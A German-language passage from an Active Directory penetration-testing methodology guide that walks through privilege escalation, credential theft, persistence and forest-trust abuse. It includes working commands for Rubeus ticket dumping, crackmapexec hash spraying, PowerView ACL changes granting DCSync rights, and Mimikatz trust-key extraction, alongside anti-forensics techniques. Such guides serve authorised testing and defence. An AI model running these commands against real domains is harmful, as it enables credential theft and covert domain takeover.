### Lokale Privilege Escalation

Wenn Sie kompromittierte Credentials oder eine Sitzung als regulärer Domänenbenutzer haben und auf **any machine in the domain** zugreifen können, suchen Sie nach einem Weg, **lokal Privileges zu eskalieren und Credentials zu sammeln**. Lokale Administratorrechte können es Ihnen ermöglichen, **Hashes anderer Benutzer** aus dem Speicher (LSASS) und dem lokalen Speicher (SAM) zu **dumpen**.

In diesem Buch gibt es eine vollständige Seite über die [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) sowie eine [**checklist**](../checklist-windows-privilege-escalation.md). Vergessen Sie außerdem nicht, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu verwenden.

### Aktuelle Sitzungstickets

Es ist sehr **unwahrscheinlich**, dass Sie **tickets** im aktuellen Benutzerkonto finden, die Ihnen **die Berechtigung zum Zugriff auf** unerwartete Ressourcen geben. Sie können jedoch Folgendes prüfen:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Mit Domain-Zugangsdaten oder einer Benutzersitzung kannst du NTLM-[**Relay-Angriffe**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erneut untersuchen: Authentifizierte Enumeration- und Coercion-Techniken können Relay-Pfade offenlegen, die während der nicht authentifizierten Reconnaissance nicht verfügbar waren.

### Sucht nach Zugangsdaten in Computer-Freigaben | SMB-Freigaben

Da du nun über einige grundlegende Zugangsdaten verfügst, solltest du prüfen, ob du **interessante Dateien finden** kannst, die **innerhalb der AD freigegeben** sind. Du könntest dies manuell erledigen, aber es ist eine sehr langweilige, repetitive Aufgabe (insbesondere, wenn du Hunderte Dokumente findest, die du überprüfen musst).

[**Folge diesem Link, um mehr über mögliche Tools zu erfahren.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM-Credentials stehlen

Wenn du auf **andere PCs oder Freigaben zugreifen** kannst, könntest du **Dateien platzieren** (zum Beispiel eine SCF-Datei), die bei einem Zugriff darauf eine **NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM-Challenge stehlen** und cracken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle ermöglichte es jedem authentifizierten Benutzer, den **Domain Controller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege Escalation in Active Directory MIT privilegierten Zugangsdaten/einer privilegierten Sitzung

**Für die folgenden Techniken reicht ein regulärer Domain-Benutzer nicht aus; du benötigst spezielle Berechtigungen/Zugangsdaten, um diese Angriffe durchzuführen.**

### Hash-Extraktion

Hoffentlich ist es dir gelungen, mithilfe von [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) einschließlich Relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) und [lokaler Privilege Escalation](../windows-local-privilege-escalation/index.html) ein **lokales Admin-Konto zu kompromittieren**.\
Dann ist es an der Zeit, alle Hashes aus dem Speicher und lokal zu dumpen.\
[**Lies diese Seite über die verschiedenen Möglichkeiten, die Hashes zu erhalten.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Benutzers hast**, kannst du ihn verwenden, um den Benutzer zu **imitieren**.\
Du musst ein **Tool** verwenden, das die **NTLM-Authentifizierung mit diesem Hash durchführt**, **oder** du kannst eine neue **sessionlogon** erstellen und diesen **Hash** in **LSASS injizieren**, damit dieser **Hash verwendet wird, wenn eine NTLM-Authentifizierung durchgeführt wird**. Die letzte Option wird von mimikatz verwendet.\
[**Lies diese Seite für weitere Informationen.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, **den NTLM-Hash des Benutzers zu verwenden, um Kerberos-Tickets anzufordern**, als Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders **in Netzwerken nützlich sein, in denen das NTLM-Protokoll deaktiviert ist** und nur **Kerberos** als Authentifizierungsprotokoll **erlaubt** ist.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der Angriffsmethode **Pass The Ticket (PTT)** **stehlen Angreifer das Authentifizierungsticket eines Benutzers**, anstatt dessen Passwort oder Hash-Werte zu stehlen. Dieses gestohlene Ticket wird anschließend verwendet, um den **Benutzer zu imitieren** und unbefugten Zugriff auf Ressourcen und Services innerhalb eines Netzwerks zu erlangen.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Wiederverwendung von Zugangsdaten

Wenn du den **Hash** oder das **Passwort** eines **lokalen Administrato**r hast, solltest du versuchen, dich damit **lokal** bei anderen **PCs anzumelden**.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachten Sie, dass dies ziemlich **auffällig** ist und **LAPS** dies **abschwächen** würde.

### MSSQL Abuse & Trusted Links

Wenn ein Benutzer über Berechtigungen zum **Zugriff auf MSSQL-Instanzen** verfügt, könnte er diese verwenden, um **Befehle auf dem MSSQL-Host auszuführen** (wenn dieser als SA läuft), den NetNTLM-**Hash zu stehlen** oder sogar einen **Relay**-**Angriff** durchzuführen.\
Wenn eine MSSQL-Instanz über einen Datenbanklink von einer anderen Instanz als vertrauenswürdig eingestuft wird, kann ein Benutzer mit Berechtigungen für die verknüpfte Datenbank möglicherweise **die Vertrauensbeziehung nutzen, um Abfragen auf der anderen Instanz auszuführen**. Diese Vertrauensbeziehungen können verkettet werden und schließlich eine falsch konfigurierte Datenbank erreichen, auf der der Benutzer Befehle ausführen kann.\
**Die Verbindungen zwischen Datenbanken funktionieren auch über Forest-Trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Missbrauch von IT-Asset-/Deployment-Plattformen

Inventarisierungs- und Deployment-Suites von Drittanbietern bieten häufig leistungsfähige Wege zu Zugangsdaten und Codeausführung. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn Sie ein Computerobjekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) finden und über Domain-Berechtigungen auf dem Computer verfügen, können Sie die TGTs aller Benutzer aus dem Speicher auslesen, die sich an dem Computer anmelden.\
Wenn sich also ein **Domain Admin an dem Computer anmeldet**, können Sie dessen TGT auslesen und ihn mit [Pass the Ticket](pass-the-ticket.md) imitieren.\
Dank Constrained Delegation könnten Sie sogar automatisch einen **Print Server kompromittieren** (hoffentlich handelt es sich dabei um einen DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn ein Benutzer oder Computer für "Constrained Delegation" zugelassen ist, kann er **jeden Benutzer imitieren, um auf bestimmte Dienste auf einem Computer zuzugreifen**.\
Wenn Sie anschließend den **Hash dieses Benutzers/Computers kompromittieren**, können Sie **jeden Benutzer** (einschließlich Domain Admins) imitieren, um auf bestimmte Dienste zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Die **WRITE**-Berechtigung für ein Active-Directory-Objekt eines entfernten Computers ermöglicht die Erlangung von Codeausführung mit **erweiterten Berechtigungen**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Missbrauch von Berechtigungen/ACLs

Der kompromittierte Benutzer könnte über **interessante Berechtigungen für bestimmte Domain-Objekte** verfügen, die es Ihnen ermöglichen könnten, sich lateral **zu bewegen**/**Berechtigungen zu erweitern**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Missbrauch des Printer-Spooler-Dienstes

Wenn Sie einen **Spool-Dienst entdecken, der innerhalb der Domain lauscht**, kann dieser **missbraucht** werden, um **neue Zugangsdaten zu erlangen** und **Berechtigungen zu erweitern**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Missbrauch von Sitzungen Dritter

Wenn **andere Benutzer** auf den **kompromittierten** Computer **zugreifen**, ist es möglich, **Zugangsdaten aus dem Speicher zu sammeln** und sogar **Beacons in ihre Prozesse einzuschleusen**, um sie zu imitieren.\
Üblicherweise greifen Benutzer per RDP auf das System zu. Daher erfahren Sie hier, wie Sie einige Angriffe auf RDP-Sitzungen Dritter durchführen:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bietet ein System zur Verwaltung des **lokalen Administratorpassworts** auf domain-verbundenen Computern und stellt sicher, dass dieses **randomisiert**, eindeutig und regelmäßig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert, und der Zugriff wird über ACLs ausschließlich für autorisierte Benutzer kontrolliert. Mit ausreichenden Berechtigungen für den Zugriff auf diese Passwörter wird ein Pivoting zu anderen Computern möglich.


{{#ref}}
laps.md
{{#endref}}

### Diebstahl von Zertifikaten

Das **Sammeln von Zertifikaten** vom kompromittierten Computer kann eine Möglichkeit sein, Berechtigungen innerhalb der Umgebung zu erweitern:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Missbrauch von Certificate Templates

Wenn **verwundbare Templates** konfiguriert sind, können diese missbraucht werden, um Berechtigungen zu erweitern:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-Exploitation mit privilegiertem Konto

### Auslesen von Domain-Zugangsdaten

Sobald Sie **Domain-Admin-** oder noch besser **Enterprise-Admin**-Berechtigungen erhalten, können Sie die **Domain-Datenbank** _ntds.dit_ **auslesen**.

[**Weitere Informationen zum DCSync-Angriff finden Sie hier**](dcsync.md).

[**Weitere Informationen zum Stehlen der NTDS.dit finden Sie hier**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc als Persistence

Einige der zuvor besprochenen Techniken können für Persistence verwendet werden.\
Zum Beispiel könnten Sie:

- Benutzer für [**Kerberoast**](kerberoast.md) verwundbar machen

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Benutzer für [**ASREPRoast**](asreproast.md) verwundbar machen

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Einem Benutzer [**DCSync**](#dcsync)-Berechtigungen gewähren

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver-Ticket-Angriff** erstellt mithilfe des **NTLM-Hashs** (beispielsweise des **Hashs des Computerkontos**) ein **legitimes Ticket-Granting-Service-(TGS-)Ticket** für einen bestimmten Dienst. Diese Methode wird verwendet, um auf die **Berechtigungen des Dienstes zuzugreifen**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bei einem **Golden-Ticket-Angriff** erlangt ein Angreifer Zugriff auf den **NTLM-Hash des krbtgt-Kontos** in einer Active-Directory-(AD-)Umgebung. Dieses Konto ist besonders wichtig, da es zum Signieren aller **Ticket-Granting-Tickets (TGTs)** verwendet wird, die für die Authentifizierung innerhalb des AD-Netzwerks erforderlich sind.

Sobald der Angreifer diesen Hash erlangt hat, kann er **TGTs** für beliebige Konten erstellen (Silver-Ticket-Angriff).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese ähneln Golden Tickets, werden jedoch so gefälscht, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence von Kontozertifikaten**

**Der Besitz von Zertifikaten eines Kontos oder die Möglichkeit, diese anzufordern**, ist eine sehr gute Möglichkeit, die Persistence im Benutzerkonto aufrechtzuerhalten (selbst wenn der Benutzer das Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence von Domain-Zertifikaten**

**Mithilfe von Zertifikaten ist es ebenfalls möglich, Persistence mit hohen Berechtigungen innerhalb der Domain aufrechtzuerhalten:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory stellt die Sicherheit **privilegierter Gruppen** (wie Domain Admins und Enterprise Admins) sicher, indem es eine standardisierte **Access Control List (ACL)** auf diese Gruppen anwendet, um unbefugte Änderungen zu verhindern. Diese Funktion kann jedoch ausgenutzt werden: Wenn ein Angreifer die ACL von AdminSDHolder so ändert, dass ein regulärer Benutzer vollständigen Zugriff erhält, bekommt dieser Benutzer weitreichende Kontrolle über alle privilegierten Gruppen. Diese eigentlich schützende Sicherheitsmaßnahme kann somit nach hinten losgehen und unberechtigten Zugriff ermöglichen, sofern sie nicht genau überwacht wird.

[**Weitere Informationen zur AdminDSHolder Group finden Sie hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

In jedem **Domain Controller (DC)** existiert ein **lokales Administratorkonto**. Wenn Sie Administratorrechte auf einem solchen Computer erlangen, kann der Hash des lokalen Administrators mit **mimikatz** extrahiert werden. Anschließend ist eine Änderung der Registry erforderlich, um **die Verwendung dieses Passworts zu aktivieren** und dadurch den Fernzugriff auf das lokale Administratorkonto zu ermöglichen.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Sie könnten einem **Benutzer** bestimmte **Sonderberechtigungen** für spezifische Domain-Objekte **gewähren**, die es dem Benutzer ermöglichen, **seine Berechtigungen in Zukunft zu erweitern**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security Descriptors** werden verwendet, um die **Berechtigungen zu speichern**, die ein **Objekt für ein anderes Objekt** besitzt. Wenn Sie lediglich eine **kleine Änderung** am **Security Descriptor** eines Objekts vornehmen können, können Sie sehr interessante Berechtigungen für dieses Objekt erlangen, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Missbrauchen Sie die Hilfsklasse `dynamicObject`, um kurzlebige Principals/GPOs/DNS-Einträge mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erstellen. Diese löschen sich ohne Tombstones selbst und beseitigen dadurch LDAP-Spuren, während verwaiste SIDs, fehlerhafte `gPLink`-Referenzen oder zwischengespeicherte DNS-Antworten zurückbleiben (z. B. eine Verschmutzung der AdminSDHolder-ACE oder bösartige `gPCFileSysPath`-/AD-integrierte DNS-Weiterleitungen).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verändern Sie **LSASS** im Speicher, um ein **universelles Passwort** einzurichten, das Zugriff auf alle Domain-Konten gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Erfahren Sie hier, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Sie können Ihren **eigenen SSP** erstellen, um die für den Zugriff auf den Computer verwendeten **Zugangsdaten** im **Klartext zu erfassen**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dabei wird ein **neuer Domain Controller** im AD registriert und verwendet, um **Attribute** (SIDHistory, SPNs ...) auf bestimmte Objekte zu **übertragen**, ohne **Logs** zu den **Änderungen** zu hinterlassen. Sie benötigen **DA**-Berechtigungen und müssen sich in der **Root-Domain** befinden.\
Beachten Sie, dass bei der Verwendung falscher Daten sehr unschöne Logs entstehen.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Zuvor haben wir besprochen, wie Berechtigungen erweitert werden können, wenn Sie über **ausreichende Berechtigungen zum Lesen von LAPS-Passwörtern** verfügen. Diese Passwörter können jedoch auch verwendet werden, um **Persistence aufrechtzuerhalten**.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest-Berechtigungserweiterung - Domain-Trusts

Microsoft betrachtet den **Forest** als Sicherheitsgrenze. Das bedeutet, dass die **Kompromittierung einer einzelnen Domain potenziell zur Kompromittierung des gesamten Forests führen kann**.<sup>[[1]](#references)</sup>

### Grundlegende Informationen

Ein [**Domain-Trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der es einem Benutzer aus einer **Domain** ermöglicht, auf Ressourcen in einer anderen **Domain** zuzugreifen. Er stellt im Wesentlichen eine Verbindung zwischen den Authentifizierungssystemen der beiden Domains her, sodass Authentifizierungsprüfungen nahtlos weitergeleitet werden können. Wenn Domains einen Trust einrichten, tauschen sie bestimmte **Schlüssel** aus und speichern diese in ihren **Domain Controllern (DCs)**. Diese Schlüssel sind für die Integrität des Trusts entscheidend.

In einem typischen Szenario muss ein Benutzer, der auf einen Dienst in einer **vertrauenswürdigen Domain** zugreifen möchte, zunächst ein spezielles Ticket namens **Inter-Realm-TGT** beim DC seiner eigenen Domain anfordern. Dieses TGT wird mit einem gemeinsamen **Schlüssel** verschlüsselt, auf den sich beide Domains geeinigt haben. Anschließend legt der Benutzer dieses TGT dem **DC der vertrauenswürdigen Domain** vor, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des Inter-Realm-TGTs durch den DC der vertrauenswürdigen Domain stellt dieser ein TGS aus, das dem Benutzer Zugriff auf den Dienst gewährt.

**Schritte**:

1. Ein **Clientcomputer** in **Domain 1** beginnt den Prozess, indem er seinen **NTLM-Hash** verwendet, um ein **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anzufordern.
2. DC1 stellt ein neues TGT aus, wenn der Client erfolgreich authentifiziert wurde.
3. Der Client fordert anschließend ein **Inter-Realm-TGT** von DC1 an, das für den Zugriff auf Ressourcen in **Domain 2** benötigt wird.
4. Das Inter-Realm-TGT wird mit einem **Trust-Schlüssel** verschlüsselt, den DC1 und DC2 im Rahmen des bidirektionalen Domain-Trusts gemeinsam verwenden.
5. Der Client übergibt das Inter-Realm-TGT an den **Domain Controller (DC2) von Domain 2**.
6. DC2 überprüft das Inter-Realm-TGT mithilfe des gemeinsamen Trust-Schlüssels und stellt, wenn es gültig ist, ein **Ticket Granting Service (TGS)** für den Server in Domain 2 aus, auf den der Client zugreifen möchte.
7. Schließlich übergibt der Client dieses TGS dem Server. Es ist mit dem Hash des Serverkontos verschlüsselt und ermöglicht den Zugriff auf den Dienst in Domain 2.

### Verschiedene Trusts

Es ist wichtig zu beachten, dass ein **Trust einseitig oder zweiseitig** sein kann. Bei einer zweiseitigen Variante vertrauen beide Domains einander. Bei einer **einseitigen** Trust-Beziehung ist eine Domain die **vertrauende** und die andere die **vertrauenswürdige** Domain. Im letzteren Fall können Sie **nur von der vertrauenswürdigen Domain aus auf Ressourcen innerhalb der vertrauenden Domain zugreifen**.

Wenn Domain A Domain B vertraut, ist A die vertrauende Domain und B die vertrauenswürdige. Außerdem handelt es sich in **Domain A** um einen **Outbound Trust** und in **Domain B** um einen **Inbound Trust**.

**Verschiedene Trust-Beziehungen**

- **Parent-Child Trusts**: Dies ist eine häufige Konfiguration innerhalb desselben Forests, bei der eine Child-Domain automatisch einen transitiven bidirektionalen Trust zu ihrer Parent-Domain besitzt. Das bedeutet im Wesentlichen, dass Authentifizierungsanfragen nahtlos zwischen Parent- und Child-Domain weitergeleitet werden können.
- **Cross-link Trusts**: Diese werden als "Shortcut Trusts" bezeichnet und zwischen Child-Domains eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssen Authentifizierungs-Referrals normalerweise zur Forest-Root und anschließend wieder zur Ziel-Domain weitergeleitet werden. Durch Cross-Links wird dieser Weg verkürzt, was besonders in geografisch verteilten Umgebungen von Vorteil ist.
- **External Trusts**: Diese werden zwischen verschiedenen, nicht miteinander verbundenen Domains eingerichtet und sind von Natur aus nicht transitiv. Laut der [Dokumentation von Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind External Trusts nützlich, um auf Ressourcen in einer Domain außerhalb des aktuellen Forests zuzugreifen, die nicht über einen Forest-Trust verbunden ist. Die Sicherheit wird bei External Trusts durch SID-Filtering erhöht.
- **Tree-root Trusts**: Diese Trusts werden automatisch zwischen der Forest-Root-Domain und einer neu hinzugefügten Tree-Root eingerichtet. Obwohl sie nicht häufig vorkommen, sind Tree-root Trusts wichtig, um neue Domain-Bäume zu einem Forest hinzuzufügen. Sie ermöglichen diesen, einen eindeutigen Domain-Namen beizubehalten und eine bidirektionale Transitivität sicherzustellen. Weitere Informationen finden Sie im [Leitfaden von Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Diese Art von Trust ist ein transitiver bidirektionaler Trust zwischen zwei Forest-Root-Domains, wobei ebenfalls SID-Filtering zur Verbesserung der Sicherheitsmaßnahmen erzwungen wird.
- **MIT Trusts**: Diese Trusts werden mit Nicht-Windows-Kerberos-Domains eingerichtet, die [RFC4120-konform](https://tools.ietf.org/html/rfc4120) sind. MIT Trusts sind etwas spezialisierter und für Umgebungen gedacht, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems benötigen.

#### Weitere Unterschiede bei **Trust-Beziehungen**

- Eine Trust-Beziehung kann auch **transitiv** sein (A vertraut B, B vertraut C, also vertraut A C) oder **nicht transitiv**.
- Eine Trust-Beziehung kann als **bidirektionaler Trust** (beide vertrauen einander) oder als **einseitiger Trust** (nur eine Domain vertraut der anderen) eingerichtet werden.

### Angriffsweg

1. Die Trust-Beziehungen **aufzählen**
2. Prüfen, ob ein **Security Principal** (Benutzer/Gruppe/Computer) **Zugriff** auf Ressourcen der **anderen Domain** besitzt, etwa durch ACE-Einträge oder durch die Mitgliedschaft in Gruppen der anderen Domain. Suchen Sie nach **Beziehungen zwischen Domains** (vermutlich wurde der Trust genau dafür eingerichtet).
1. Kerberoast könnte in diesem Fall eine weitere Option sein.
3. Die Konten **kompromittieren**, die ein **Pivoting** zwischen Domains ermöglichen.

Angreifer können über drei primäre Mechanismen auf Ressourcen in einer anderen Domain zugreifen:

- **Mitgliedschaft in lokalen Gruppen**: Principals können lokalen Gruppen auf Computern hinzugefügt werden, beispielsweise der Gruppe „Administrators“ auf einem Server, wodurch sie weitreichende Kontrolle über diesen Computer erhalten.
- **Mitgliedschaft in Gruppen einer fremden Domain**: Principals können auch Mitglieder von Gruppen innerhalb der fremden Domain sein. Die Wirksamkeit dieser Methode hängt jedoch von der Art des Trusts und dem Geltungsbereich der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL** angegeben sein, insbesondere als Entitäten in **ACEs** innerhalb einer **DACL**, wodurch sie Zugriff auf bestimmte Ressourcen erhalten. Wer die Funktionsweise von ACLs, DACLs und ACEs genauer verstehen möchte, findet im Whitepaper „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)“ eine wertvolle Ressource.<sup>[[17]](#references)</sup>

### Fremde Benutzer/Gruppen mit Berechtigungen finden

Sie können **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** überprüfen, um fremde Security Principals in der Domain zu finden. Dabei handelt es sich um Benutzer/Gruppen aus **einer externen Domain/einem externen Forest**.

Sie können dies in **Bloodhound** oder mit PowerView überprüfen:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Privilege escalation von Child zu Parent im Forest
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Weitere Möglichkeiten zur Enumeration von Domain Trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 trusted keys**, eine für _Child --> Parent_ und eine weitere für _Parent_ --> _Child_.\
> Mit folgendem Befehl können Sie den vom aktuellen Domain verwendeten Schlüssel abrufen:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskalieren Sie mithilfe von SID-History injection als Enterprise admin in die Child-/Parent-Domain, indem Sie den Trust ausnutzen:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Ausnutzung einer beschreibbaren Configuration NC

Das Verständnis, wie die Configuration Naming Context (NC) ausgenutzt werden kann, ist entscheidend. Die Configuration NC dient in Active Directory (AD)-Umgebungen als zentrales Repository für Konfigurationsdaten im gesamten Forest. Diese Daten werden auf jeden Domain Controller (DC) innerhalb des Forests repliziert, wobei beschreibbare DCs eine beschreibbare Kopie der Configuration NC verwalten. Für die Ausnutzung benötigt man **SYSTEM privileges auf einem DC**, vorzugsweise einem Child-DC.

**GPO mit der Root-DC-Site verknüpfen**

Der Sites-Container der Configuration NC enthält Informationen zu den Sites aller domain-joined Computer innerhalb des AD-Forests. Mit SYSTEM privileges auf einem beliebigen DC können Angreifer GPOs mit den Root-DC-Sites verknüpfen. Dadurch kann die Root-Domain kompromittiert werden, indem die auf diese Sites angewendeten Richtlinien manipuliert werden.

Ausführliche Informationen finden Sie in der Forschung zu [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Beliebige gMSA im Forest kompromittieren**

Ein Angriffsvektor besteht darin, privilegierte gMSAs innerhalb der Domain anzugreifen. Der KDS Root key, der für die Berechnung der Passwörter von gMSAs erforderlich ist, wird in der Configuration NC gespeichert. Mit SYSTEM privileges auf einem beliebigen DC ist es möglich, auf den KDS Root key zuzugreifen und die Passwörter beliebiger gMSAs im gesamten Forest zu berechnen.

Eine detaillierte Analyse und schrittweise Anleitung finden Sie unter:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ergänzender delegierter MSA-Angriff (BadSuccessor – Ausnutzung von Migrationsattributen):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Zusätzliche externe Forschung: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema-Änderungsangriff**

Diese Methode erfordert Geduld, da auf die Erstellung neuer privilegierter AD-Objekte gewartet werden muss. Mit SYSTEM privileges kann ein Angreifer das AD Schema ändern, um beliebigen Benutzern vollständige Kontrolle über alle Klassen zu gewähren. Dies kann zu unbefugtem Zugriff auf neu erstellte AD-Objekte und deren Kontrolle führen.

Weitere Informationen finden Sie unter [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Von DA zu EA mit ADCS ESC5**

Die ADCS-ESC5-Schwachstelle zielt auf die Kontrolle über Public-Key-Infrastructure-(PKI-)Objekte ab, um ein Certificate Template zu erstellen, das die Authentifizierung als beliebiger Benutzer innerhalb des Forests ermöglicht. Da sich PKI-Objekte in der Configuration NC befinden, ermöglicht die Kompromittierung eines beschreibbaren Child-DCs die Durchführung von ESC5-Angriffen.

Weitere Details finden Sie unter [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> In Szenarien ohne ADCS kann der Angreifer die erforderlichen Komponenten einrichten, wie in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.<sup>[[16]](#references)</sup>

### Externe Forest-Domain – One-Way (Inbound) oder bidirektional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario wird **deiner Domäne** von einer externen Domäne **Vertrauen entgegengebracht**, wodurch du **nicht näher bestimmte Berechtigungen** für sie erhältst. Du musst herausfinden, **welche Principals deiner Domäne über welche Zugriffsrechte auf die externe Domäne verfügen**, und anschließend versuchen, diese auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domäne – Einseitig (ausgehend)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario **vertraut deine Domain** einem Prinzipal aus **einer anderen Domain** bestimmte **Berechtigungen** an.

